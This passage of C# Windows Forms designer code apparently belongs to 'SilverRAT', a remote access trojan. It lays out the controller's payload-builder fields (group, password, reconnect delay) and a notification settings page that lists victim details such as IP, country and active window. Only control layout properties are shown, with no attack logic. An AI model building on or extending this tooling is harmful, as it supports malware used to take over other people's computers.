        this.BuilderGroup.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.BuilderGroup.DefaultText = "";
        this.BuilderGroup.FillColor = System.Drawing.Color.White;
        this.BuilderGroup.HideSelection = true;
        this.BuilderGroup.IconLeft = null;
        this.BuilderGroup.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderGroup.IconPadding = 10;
        this.BuilderGroup.IconRight = null;
        this.BuilderGroup.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderGroup.Lines = new string[0];
        this.BuilderGroup.Location = new System.Drawing.Point(36, 37);
        this.BuilderGroup.MaxLength = 32767;
        this.BuilderGroup.MinimumSize = new System.Drawing.Size(1, 1);
        this.BuilderGroup.Modified = false;
        this.BuilderGroup.Multiline = false;
        this.BuilderGroup.Name = "BuilderGroup";
        stateProperties97.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties97.FillColor = System.Drawing.Color.Empty;
        stateProperties97.ForeColor = System.Drawing.Color.Empty;
        stateProperties97.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderGroup.OnActiveState = stateProperties97;
        stateProperties98.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties98.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties98.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties98.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.BuilderGroup.OnDisabledState = stateProperties98;
        stateProperties99.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties99.FillColor = System.Drawing.Color.Empty;
        stateProperties99.ForeColor = System.Drawing.Color.Empty;
        stateProperties99.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderGroup.OnHoverState = stateProperties99;
        stateProperties100.BorderColor = System.Drawing.Color.Silver;
        stateProperties100.FillColor = System.Drawing.Color.White;
        stateProperties100.ForeColor = System.Drawing.Color.Empty;
        stateProperties100.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderGroup.OnIdleState = stateProperties100;
        this.BuilderGroup.Padding = new System.Windows.Forms.Padding(3);
        this.BuilderGroup.PasswordChar = '\0';
        this.BuilderGroup.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.BuilderGroup.PlaceholderText = "Group";
        this.BuilderGroup.ReadOnly = false;
        this.BuilderGroup.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.BuilderGroup.SelectedText = "";
        this.BuilderGroup.SelectionLength = 0;
        this.BuilderGroup.SelectionStart = 0;
        this.BuilderGroup.ShortcutsEnabled = true;
        this.BuilderGroup.Size = new System.Drawing.Size(284, 28);
        this.BuilderGroup.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.BuilderGroup.TabIndex = 600;
        this.BuilderGroup.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.BuilderGroup.TextMarginBottom = 0;
        this.BuilderGroup.TextMarginLeft = 3;
        this.BuilderGroup.TextMarginTop = 1;
        this.BuilderGroup.TextPlaceholder = "Group";
        this.BuilderGroup.UseSystemPasswordChar = false;
        this.BuilderGroup.WordWrap = true;
        // 
        // BuilderKey
        // 
        this.BuilderKey.AcceptsReturn = false;
        this.BuilderKey.AcceptsTab = false;
        this.BuilderKey.AnimationSpeed = 200;
        this.BuilderKey.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.BuilderKey.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.BuilderKey.AutoSizeHeight = true;
        this.BuilderKey.BackColor = System.Drawing.Color.Transparent;
        this.BuilderKey.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderKey.BackgroundImage")));
        this.BuilderKey.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderKey.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.BuilderKey.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderKey.BorderColorIdle = System.Drawing.Color.Silver;
        this.BuilderKey.BorderRadius = 2;
        this.BuilderKey.BorderThickness = 1;
        this.BuilderKey.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.BuilderKey.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.BuilderKey.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderKey.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.BuilderKey.DefaultText = "";
        this.BuilderKey.FillColor = System.Drawing.Color.White;
        this.BuilderKey.HideSelection = true;
        this.BuilderKey.IconLeft = null;
        this.BuilderKey.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderKey.IconPadding = 3;
        this.BuilderKey.IconRight = global::SilverRAT.Properties.Resources.UpdateText;
        this.BuilderKey.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderKey.Lines = new string[0];
        this.BuilderKey.Location = new System.Drawing.Point(36, 71);
        this.BuilderKey.MaxLength = 32767;
        this.BuilderKey.MinimumSize = new System.Drawing.Size(1, 1);
        this.BuilderKey.Modified = false;
        this.BuilderKey.Multiline = false;
        this.BuilderKey.Name = "BuilderKey";
        stateProperties101.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties101.FillColor = System.Drawing.Color.Empty;
        stateProperties101.ForeColor = System.Drawing.Color.Empty;
        stateProperties101.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderKey.OnActiveState = stateProperties101;
        stateProperties102.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties102.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties102.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties102.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.BuilderKey.OnDisabledState = stateProperties102;
        stateProperties103.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties103.FillColor = System.Drawing.Color.Empty;
        stateProperties103.ForeColor = System.Drawing.Color.Empty;
        stateProperties103.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderKey.OnHoverState = stateProperties103;
        stateProperties104.BorderColor = System.Drawing.Color.Silver;
        stateProperties104.FillColor = System.Drawing.Color.White;
        stateProperties104.ForeColor = System.Drawing.Color.Empty;
        stateProperties104.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderKey.OnIdleState = stateProperties104;
        this.BuilderKey.Padding = new System.Windows.Forms.Padding(3);
        this.BuilderKey.PasswordChar = '\0';
        this.BuilderKey.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.BuilderKey.PlaceholderText = "Password";
        this.BuilderKey.ReadOnly = false;
        this.BuilderKey.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.BuilderKey.SelectedText = "";
        this.BuilderKey.SelectionLength = 0;
        this.BuilderKey.SelectionStart = 0;
        this.BuilderKey.ShortcutsEnabled = true;
        this.BuilderKey.Size = new System.Drawing.Size(284, 28);
        this.BuilderKey.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.BuilderKey.TabIndex = 599;
        this.BuilderKey.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.BuilderKey.TextMarginBottom = 0;
        this.BuilderKey.TextMarginLeft = 3;
        this.BuilderKey.TextMarginTop = 1;
        this.BuilderKey.TextPlaceholder = "Password";
        this.BuilderKey.UseSystemPasswordChar = false;
        this.BuilderKey.WordWrap = true;
        this.BuilderKey.OnIconRightClick += new System.EventHandler(this.BuilderKey_OnIconRightClick);
        // 
        // BuilderDelayConnect
        // 
        this.BuilderDelayConnect.AllowBindingControlAnimation = true;
        this.BuilderDelayConnect.AllowBindingControlColorChanges = false;
        this.BuilderDelayConnect.AllowBindingControlLocation = true;
        this.BuilderDelayConnect.AllowCheckBoxAnimation = true;
        this.BuilderDelayConnect.AllowCheckmarkAnimation = true;
        this.BuilderDelayConnect.AllowOnHoverStates = true;
        this.BuilderDelayConnect.AutoCheck = true;
        this.BuilderDelayConnect.BackColor = System.Drawing.Color.Transparent;
        this.BuilderDelayConnect.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderDelayConnect.BackgroundImage")));
        this.BuilderDelayConnect.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.BuilderDelayConnect.BindingControl = this.TxDelay;
        this.BuilderDelayConnect.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.BuilderDelayConnect.BorderRadius = 6;
        this.BuilderDelayConnect.Checked = false;
        this.BuilderDelayConnect.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.BuilderDelayConnect.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BuilderDelayConnect.CustomCheckmarkImage = null;
        this.BuilderDelayConnect.Location = new System.Drawing.Point(38, 216);
        this.BuilderDelayConnect.MinimumSize = new System.Drawing.Size(17, 17);
        this.BuilderDelayConnect.Name = "BuilderDelayConnect";
        this.BuilderDelayConnect.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderDelayConnect.OnCheck.BorderRadius = 6;
        this.BuilderDelayConnect.OnCheck.BorderThickness = 2;
        this.BuilderDelayConnect.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderDelayConnect.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderDelayConnect.OnCheck.CheckmarkThickness = 2;
        this.BuilderDelayConnect.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.BuilderDelayConnect.OnDisable.BorderRadius = 6;
        this.BuilderDelayConnect.OnDisable.BorderThickness = 2;
        this.BuilderDelayConnect.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderDelayConnect.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.BuilderDelayConnect.OnDisable.CheckmarkThickness = 2;
        this.BuilderDelayConnect.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderDelayConnect.OnHoverChecked.BorderRadius = 6;
        this.BuilderDelayConnect.OnHoverChecked.BorderThickness = 2;
        this.BuilderDelayConnect.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderDelayConnect.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderDelayConnect.OnHoverChecked.CheckmarkThickness = 2;
        this.BuilderDelayConnect.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderDelayConnect.OnHoverUnchecked.BorderRadius = 6;
        this.BuilderDelayConnect.OnHoverUnchecked.BorderThickness = 1;
        this.BuilderDelayConnect.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderDelayConnect.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.BuilderDelayConnect.OnUncheck.BorderRadius = 6;
        this.BuilderDelayConnect.OnUncheck.BorderThickness = 1;
        this.BuilderDelayConnect.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.BuilderDelayConnect.Size = new System.Drawing.Size(21, 21);
        this.BuilderDelayConnect.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.BuilderDelayConnect.TabIndex = 598;
        this.BuilderDelayConnect.ThreeState = false;
        this.BuilderDelayConnect.ToolTipText = null;
        this.BuilderDelayConnect.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.BuilderDelayConnect_CheckedChanged);
        // 
        // TxDelay
        // 
        this.TxDelay.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxDelay.AutoSize = true;
        this.TxDelay.BackColor = System.Drawing.Color.Transparent;
        this.TxDelay.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxDelay.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxDelay.ForeColor = System.Drawing.Color.Black;
        this.TxDelay.Location = new System.Drawing.Point(62, 220);
        this.TxDelay.Name = "TxDelay";
        this.TxDelay.Size = new System.Drawing.Size(95, 15);
        this.TxDelay.TabIndex = 596;
        this.TxDelay.Text = "Reconnect Delay";
        // 
        // bunifuSeparator1
        // 
        this.bunifuSeparator1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuSeparator1.BackColor = System.Drawing.Color.White;
        this.bunifuSeparator1.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuSeparator1.BackgroundImage")));
        this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
        this.bunifuSeparator1.LineColor = System.Drawing.Color.Silver;
        this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
        this.bunifuSeparator1.LineThickness = 1;
        this.bunifuSeparator1.Location = new System.Drawing.Point(8, 443);
        this.bunifuSeparator1.Name = "bunifuSeparator1";
        this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
        this.bunifuSeparator1.Size = new System.Drawing.Size(924, 11);
        this.bunifuSeparator1.TabIndex = 597;
        // 
        // Page6
        // 
        this.Page6.BackColor = System.Drawing.Color.White;
        this.Page6.Controls.Add(this.PanelSettings);
        this.Page6.Location = new System.Drawing.Point(4, 4);
        this.Page6.Name = "Page6";
        this.Page6.Size = new System.Drawing.Size(944, 487);
        this.Page6.TabIndex = 5;
        this.Page6.Text = "PageSetting";
        // 
        // PanelSettings
        // 
        this.PanelSettings.Controls.Add(this.bunifuShadowPanel4);
        this.PanelSettings.Dock = System.Windows.Forms.DockStyle.Fill;
        this.PanelSettings.Location = new System.Drawing.Point(0, 0);
        this.PanelSettings.Name = "PanelSettings";
        this.PanelSettings.Size = new System.Drawing.Size(944, 487);
        this.PanelSettings.TabIndex = 1;
        this.PanelSettings.Visible = false;
        // 
        // bunifuShadowPanel4
        // 
        this.bunifuShadowPanel4.BackColor = System.Drawing.Color.White;
        this.bunifuShadowPanel4.BorderColor = System.Drawing.Color.White;
        this.bunifuShadowPanel4.BorderRadius = 20;
        this.bunifuShadowPanel4.BorderThickness = 1;
        this.bunifuShadowPanel4.Controls.Add(this.TestNotif);
        this.bunifuShadowPanel4.Controls.Add(this.SaveSetting);
        this.bunifuShadowPanel4.Controls.Add(this.pictureBox7);
        this.bunifuShadowPanel4.Controls.Add(this.label15);
        this.bunifuShadowPanel4.Controls.Add(this.bunifuLabel7);
        this.bunifuShadowPanel4.Controls.Add(this.EffectNotif);
        this.bunifuShadowPanel4.Controls.Add(this.pictureBox6);
        this.bunifuShadowPanel4.Controls.Add(this.label14);
        this.bunifuShadowPanel4.Controls.Add(this.bunifuSeparator5);
        this.bunifuShadowPanel4.Controls.Add(this.ScrollToOutNotif);
        this.bunifuShadowPanel4.Controls.Add(this.bunifuLabel5);
        this.bunifuShadowPanel4.Controls.Add(this.label13);
        this.bunifuShadowPanel4.Controls.Add(this.TxPings);
        this.bunifuShadowPanel4.Controls.Add(this.ShowCloseButtNotif);
        this.bunifuShadowPanel4.Controls.Add(this.TxMonitors);
        this.bunifuShadowPanel4.Controls.Add(this.label12);
        this.bunifuShadowPanel4.Controls.Add(this.EnablePings);
        this.bunifuShadowPanel4.Controls.Add(this.ShowIconNotif);
        this.bunifuShadowPanel4.Controls.Add(this.SpeedNotif);
        this.bunifuShadowPanel4.Controls.Add(this.TxWindowsActive);
        this.bunifuShadowPanel4.Controls.Add(this.TextDelayNotif);
        this.bunifuShadowPanel4.Controls.Add(this.EnableMonitors);
        this.bunifuShadowPanel4.Controls.Add(this.TextMessageNotif);
        this.bunifuShadowPanel4.Controls.Add(this.EnableWindowsActive);
        this.bunifuShadowPanel4.Controls.Add(this.TextTitleNotif);
        this.bunifuShadowPanel4.Controls.Add(this.pictureBox5);
        this.bunifuShadowPanel4.Controls.Add(this.label10);
        this.bunifuShadowPanel4.Controls.Add(this.label9);
        this.bunifuShadowPanel4.Controls.Add(this.TxCountry);
        this.bunifuShadowPanel4.Controls.Add(this.EnableCountry);
        this.bunifuShadowPanel4.Controls.Add(this.label7);
        this.bunifuShadowPanel4.Controls.Add(this.CountScroolForm);
        this.bunifuShadowPanel4.Controls.Add(this.EnableFlag);
        this.bunifuShadowPanel4.Controls.Add(this.CurvatureFormTrackBar);
        this.bunifuShadowPanel4.Controls.Add(this.TxFlag);
        this.bunifuShadowPanel4.Controls.Add(this.EdgecurvatureForm);
        this.bunifuShadowPanel4.Controls.Add(this.EnableIP);
        this.bunifuShadowPanel4.Controls.Add(this.label1);
        this.bunifuShadowPanel4.Controls.Add(this.TxIP);
        this.bunifuShadowPanel4.Controls.Add(this.CurvatureProperties);
        this.bunifuShadowPanel4.Controls.Add(this.EnableID);
        this.bunifuShadowPanel4.Controls.Add(this.TransitionSpeed);
        this.bunifuShadowPanel4.Controls.Add(this.TxID);
        this.bunifuShadowPanel4.Controls.Add(this.TransitionOut);
        this.bunifuShadowPanel4.Controls.Add(this.EnableLogo);
        this.bunifuShadowPanel4.Controls.Add(this.TxLogo);
        this.bunifuShadowPanel4.Controls.Add(this.TransitionLogin);
        this.bunifuShadowPanel4.Controls.Add(this.bunifuLabel6);
        this.bunifuShadowPanel4.Dock = System.Windows.Forms.DockStyle.Fill;
        this.bunifuShadowPanel4.FillStyle = Bunifu.UI.WinForms.BunifuShadowPanel.FillStyles.Solid;
        this.bunifuShadowPanel4.GradientMode = Bunifu.UI.WinForms.BunifuShadowPanel.GradientModes.Vertical;
        this.bunifuShadowPanel4.Location = new System.Drawing.Point(0, 0);
        this.bunifuShadowPanel4.Name = "bunifuShadowPanel4";
        this.bunifuShadowPanel4.PanelColor = System.Drawing.Color.White;
        this.bunifuShadowPanel4.PanelColor2 = System.Drawing.Color.White;
        this.bunifuShadowPanel4.ShadowColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
        this.bunifuShadowPanel4.ShadowDept = 2;
        this.bunifuShadowPanel4.ShadowDepth = 5;
        this.bunifuShadowPanel4.ShadowStyle = Bunifu.UI.WinForms.BunifuShadowPanel.ShadowStyles.Surrounded;
        this.bunifuShadowPanel4.ShadowTopLeftVisible = false;
        this.bunifuShadowPanel4.Size = new System.Drawing.Size(944, 487);
        this.bunifuShadowPanel4.Style = Bunifu.UI.WinForms.BunifuShadowPanel.BevelStyles.Flat;
        this.bunifuShadowPanel4.TabIndex = 643;
        // 
        // TestNotif
        // 
        this.TestNotif.Animated = true;
        this.TestNotif.BorderRadius = 1;
        this.TestNotif.CheckedState.Parent = this.TestNotif;
        this.TestNotif.CustomImages.Parent = this.TestNotif;
        this.TestNotif.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(159)))), ((int)(((byte)(67)))));
        this.TestNotif.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(159)))), ((int)(((byte)(67)))));
        this.TestNotif.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.TestNotif.ForeColor = System.Drawing.Color.White;
        this.TestNotif.HoverState.Parent = this.TestNotif;
        this.TestNotif.Location = new System.Drawing.Point(753, 201);
        this.TestNotif.Name = "TestNotif";
        this.TestNotif.ShadowDecoration.Parent = this.TestNotif;
        this.TestNotif.Size = new System.Drawing.Size(81, 21);
        this.TestNotif.TabIndex = 656;
        this.TestNotif.Text = "Test";
        this.TestNotif.Click += new System.EventHandler(this.TestNotif_Click);
        // 
        // SaveSetting
        // 
        this.SaveSetting.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
        this.SaveSetting.Animated = true;
        this.SaveSetting.BorderRadius = 2;
        this.SaveSetting.CheckedState.Parent = this.SaveSetting;
        this.SaveSetting.CustomImages.Parent = this.SaveSetting;
        this.SaveSetting.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.SaveSetting.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.SaveSetting.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.SaveSetting.ForeColor = System.Drawing.Color.White;
        this.SaveSetting.HoverState.Parent = this.SaveSetting;
        this.SaveSetting.Location = new System.Drawing.Point(788, 370);
        this.SaveSetting.Name = "SaveSetting";
        this.SaveSetting.ShadowDecoration.Parent = this.SaveSetting;
        this.SaveSetting.Size = new System.Drawing.Size(98, 27);
        this.SaveSetting.TabIndex = 655;
        this.SaveSetting.Text = "Save";
        this.SaveSetting.Click += new System.EventHandler(this.SaveSetting_Click);
        // 
        // pictureBox7
        // 
        this.pictureBox7.Location = new System.Drawing.Point(788, 11);
        this.pictureBox7.Name = "pictureBox7";
        this.pictureBox7.Size = new System.Drawing.Size(39, 30);
        this.pictureBox7.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox7.TabIndex = 654;
        this.pictureBox7.TabStop = false;
        // 
        // label15
        // 
        this.label15.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label15.AutoSize = true;
        this.label15.BackColor = System.Drawing.Color.Transparent;
        this.label15.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label15.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label15.ForeColor = System.Drawing.Color.Black;
        this.label15.Location = new System.Drawing.Point(680, 158);
        this.label15.Name = "label15";
        this.label15.Size = new System.Drawing.Size(75, 15);
        this.label15.TabIndex = 653;
        this.label15.Text = "Popup effect";
        // 
        // bunifuLabel7
        // 
        this.bunifuLabel7.AllowParentOverrides = false;
        this.bunifuLabel7.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuLabel7.AutoEllipsis = false;
        this.bunifuLabel7.AutoSize = false;
        this.bunifuLabel7.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel7.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel7.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel7.ForeColor = System.Drawing.Color.Gray;
        this.bunifuLabel7.Location = new System.Drawing.Point(377, 15);
        this.bunifuLabel7.Name = "bunifuLabel7";
        this.bunifuLabel7.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel7.Size = new System.Drawing.Size(378, 17);
        this.bunifuLabel7.TabIndex = 652;
        this.bunifuLabel7.Text = "Notification Settings";
        this.bunifuLabel7.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.bunifuLabel7.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // EffectNotif
        // 
        this.EffectNotif.AllowBindingControlAnimation = true;
        this.EffectNotif.AllowBindingControlColorChanges = false;
        this.EffectNotif.AllowBindingControlLocation = true;
        this.EffectNotif.AllowCheckBoxAnimation = true;
        this.EffectNotif.AllowCheckmarkAnimation = true;
        this.EffectNotif.AllowOnHoverStates = true;
        this.EffectNotif.AutoCheck = true;
        this.EffectNotif.BackColor = System.Drawing.Color.Transparent;
        this.EffectNotif.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("EffectNotif.BackgroundImage")));
        this.EffectNotif.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EffectNotif.BindingControl = this.label15;
        this.EffectNotif.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EffectNotif.BorderRadius = 6;
        this.EffectNotif.Checked = false;
        this.EffectNotif.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EffectNotif.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EffectNotif.CustomCheckmarkImage = null;
        this.EffectNotif.Location = new System.Drawing.Point(656, 154);
        this.EffectNotif.MinimumSize = new System.Drawing.Size(17, 17);
        this.EffectNotif.Name = "EffectNotif";
        this.EffectNotif.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EffectNotif.OnCheck.BorderRadius = 6;
        this.EffectNotif.OnCheck.BorderThickness = 2;
        this.EffectNotif.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EffectNotif.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EffectNotif.OnCheck.CheckmarkThickness = 2;
        this.EffectNotif.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EffectNotif.OnDisable.BorderRadius = 6;
        this.EffectNotif.OnDisable.BorderThickness = 2;
        this.EffectNotif.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EffectNotif.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EffectNotif.OnDisable.CheckmarkThickness = 2;
        this.EffectNotif.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EffectNotif.OnHoverChecked.BorderRadius = 6;
        this.EffectNotif.OnHoverChecked.BorderThickness = 2;
        this.EffectNotif.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EffectNotif.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EffectNotif.OnHoverChecked.CheckmarkThickness = 2;
        this.EffectNotif.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EffectNotif.OnHoverUnchecked.BorderRadius = 6;
        this.EffectNotif.OnHoverUnchecked.BorderThickness = 1;
        this.EffectNotif.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EffectNotif.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EffectNotif.OnUncheck.BorderRadius = 6;
        this.EffectNotif.OnUncheck.BorderThickness = 1;
        this.EffectNotif.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EffectNotif.Size = new System.Drawing.Size(21, 21);
        this.EffectNotif.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EffectNotif.TabIndex = 652;
        this.EffectNotif.ThreeState = false;
        this.EffectNotif.ToolTipText = null;
        // 
        // pictureBox6
        // 
        this.pictureBox6.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox6.Image")));
        this.pictureBox6.Location = new System.Drawing.Point(411, 266);
        this.pictureBox6.Name = "pictureBox6";
        this.pictureBox6.Size = new System.Drawing.Size(159, 138);
        this.pictureBox6.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.pictureBox6.TabIndex = 651;
        this.pictureBox6.TabStop = false;
        // 
        // label14
        // 
        this.label14.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label14.AutoSize = true;
        this.label14.BackColor = System.Drawing.Color.Transparent;
        this.label14.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label14.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label14.ForeColor = System.Drawing.Color.Black;
        this.label14.Location = new System.Drawing.Point(555, 158);
        this.label14.Name = "label14";
        this.label14.Size = new System.Drawing.Size(72, 15);
        this.label14.TabIndex = 651;
        this.label14.Text = "Scroll in/out";
        // 
        // bunifuSeparator5
        // 
        this.bunifuSeparator5.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)
